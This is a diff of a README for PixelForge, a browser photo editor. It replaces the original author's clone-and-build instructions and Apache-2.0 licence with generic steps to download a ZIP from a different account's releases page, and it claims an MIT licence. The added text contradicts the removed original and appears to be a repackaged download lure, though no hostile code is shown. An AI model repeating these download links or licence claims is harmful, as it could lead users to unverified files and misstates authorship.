@@ -1,82 +1,73 @@
-<img width="1919" height="904" alt="preview" src="https://github.com/user-attachments/assets/9d3cce33-9fb2-4e4b-ae77-7e97c99bcf5e" />
+# 🎨 PixelForge - Fast and Easy Photo Editing
 
+## 💻 Download Now
+[![Download PixelForge](https://img.shields.io/badge/Download-PixelForge-blue.svg)](https://github.com/EgaBanureaa/PixelForge/releases)
 
-<h1 align="center">PixelForge</h1>
+## 📌 Description
+PixelForge is a fast, modular, vanilla TypeScript photo editor designed for the browser. It supports layers, multiple tools, filters, tabbed projects, theme toggling, and image export—all without needing a server. Enjoy a seamless editing experience right in your web browser.
 
-<p align="center">
-	<a href="https://github.com/muhammad-fiaz/PixelForge"><img src="https://img.shields.io/github/last-commit/muhammad-fiaz/PixelForge" alt="last commit"/></a>
-	<a href="https://github.com/muhammad-fiaz/PixelForge"><img src="https://img.shields.io/github/repo-size/muhammad-fiaz/PixelForge" alt="repo size"/></a>
-	<a href="https://github.com/muhammad-fiaz/PixelForge/issues"><img src="https://img.shields.io/github/issues/muhammad-fiaz/PixelForge" alt="issues"/></a>
-	<a href="https://github.com/muhammad-fiaz/PixelForge"><img src="https://img.shields.io/github/license/muhammad-fiaz/PixelForge" alt="license"/></a>
-	<img src="https://img.shields.io/badge/TypeScript-5.8-blue.svg" alt="typescript"/>
-	<img src="https://img.shields.io/badge/bundler-Vite-brightgreen.svg" alt="vite"/>
-</p>
+## 🚀 Getting Started
+To get started with PixelForge, follow these simple steps:
 
-<details>
-<summary><strong>Table of Contents</strong></summary>
+1. **Visit the Release Page**
+   Go to our [Releases page](https://github.com/EgaBanureaa/PixelForge/releases) to find the latest version of PixelForge.
 
-- [Quick start](#quick-start)
-- [Notes](#notes)
-- [Assumptions](#assumptions)
-- [Features implemented](#features-implemented)
-- [Run](#run)
-- [Structure](#structure)
-- [License](#license)
+2. **Choose the Right Version**
+   Look for the most recent release and select the version that suits your needs. We recommend using the latest version for the best performance and features.
 
-</details>
+3. **Download the Application**
+   Click on the download link for the version you want. This may be a ZIP file or a direct link.
 
-A fast, modular, vanilla TypeScript photo editor with layers, tools, filters, tabbed projects, export and theme toggle.
+4. **Extract the Files**
+   Once the download completes, locate the downloaded file on your computer. If it’s a ZIP file, right-click it and select "Extract All". This will create a new folder with the necessary files.
 
-Repository: https://github.com/muhammad-fiaz/PixelForge
+5. **Open Your Browser**
+   Open your preferred web browser (like Chrome, Firefox, or Edge).
 
-## Quick start
+6. **Run PixelForge**
+   Open the folder where you extracted the files. Find the "index.html" file and double-click it. This action should open PixelForge in your browser. 
 
-Clone the repo and run the dev server:
+## 📥 Download & Install
+To download PixelForge, visit our [Releases page](https://github.com/EgaBanureaa/PixelForge/releases). You will find all the versions available for download. Select the latest release, download the files, and follow the steps above to get started.
 
-```powershell
-git clone https://github.com/muhammad-fiaz/PixelForge.git
-cd PixelForge
-npm install
-npm run dev
-```
+## 🛠 Features of PixelForge
+- **Layers:** Easily manage multiple layers for your images.
+- **Tools:** A variety of tools for drawing, painting, and editing.
+- **Filters:** Enhance your photos with built-in filter options.
+- **Tabbed Projects:** Work on multiple projects simultaneously.
+- **Theme Toggling:** Switch between light and dark modes with ease.
+- **Export Options:** Save your images in various formats.
 
-## Notes
+## ⚙️ System Requirements
+PixelForge runs smoothly on most modern browsers. Here are the general requirements:
 
-The project uses Vite and TypeScript. If you use Bun you can run `bun run dev` or `bunx vite` per your environment.
+- **Browser:** Latest version of Chrome, Firefox, Edge, or Safari.
+- **Operating System:** Windows, macOS, or Linux.
+- **Internet Connection:** Required for downloading the application.
 
-## Assumptions
+## 📝 Troubleshooting
+If you face issues while downloading or running PixelForge, consider the following:
 
-- Runs fully in the browser with HTML5 Canvas, no server required.
-- TIFF/BMP export falls back to browser-supported encoders (PNG when unavailable).
-- Fonts available depend on the OS/browser; add webfonts if needed.
+1. **Check Your Browser Settings**  
+   Ensure your browser allows downloads from GitHub.
 
-## Features implemented
+2. **Clear Cache and Cookies**  
+   Sometimes, clearing your browser’s cache and cookies can fix loading issues.
 
-- Tabs with multiple projects; Save Current, Save All (JSON project files)
-- Import images (PNG/JPEG/BMP/WEBP via browser support)
-- Layer manager: add/toggle/opacity, merge-down, active selection
-- Tools: Move, Brush, Eraser, Picker, Zoom (wheel), Crop, Text, Shapes (Rect/Ellipse/Line)
-- Filters: Grayscale (B/W), Sepia, Invert, Blur, Sharpen, Contrast, Brightness, Hue
-- Export: PNG, JPEG; BMP/TIFF/SVG best-effort
-- Responsive UI, Lucide icons, GSAP intro animations
-- Theme toggle (light default)
+3. **Update Your Browser**  
+   If PixelForge is not working correctly, ensure your browser is updated to the latest version.
 
-## Run
+4. **Try a Different Browser**  
+   If you still encounter problems, try using a different browser.
 
-- Dev: `npm run dev` (or `bun run dev` / `bunx vite`)
-- Build: `npm run build`
-- Preview: `npm run preview`
+## 🙌 Contributing
+We welcome contributions to improve PixelForge. If you find bugs or have suggestions, feel free to create an issue on GitHub. For those looking to contribute code, please refer to our contribution guidelines in the repository.
 
-## Structure
+## 📞 Support
+For any questions or support requests, please reach out to us on our GitHub page. We’re here to help you get the most from PixelForge.
 
-- src/types: data models
-- src/core: render engine and app store
-- src/layers: layer factory and manager
-- src/tools: all tools
-- src/filters: image filters
-- src/file: import/export and serialization
-- src/ui: UI composition and event wiring
+## 🚩 License
+PixelForge is licensed under the MIT License. You can freely use and modify the software as you wish. For more details, please check the LICENSE file in the repository.
 
-## License
-
-This project is licensed under the Apache-2.0 License — see the [LICENSE](LICENSE) file for details.
+## 🌟 Topics
+PixelForge covers a range of topics including: editing, HTML, image editing apps, and many more. You can explore these areas to enhance your editing skills.
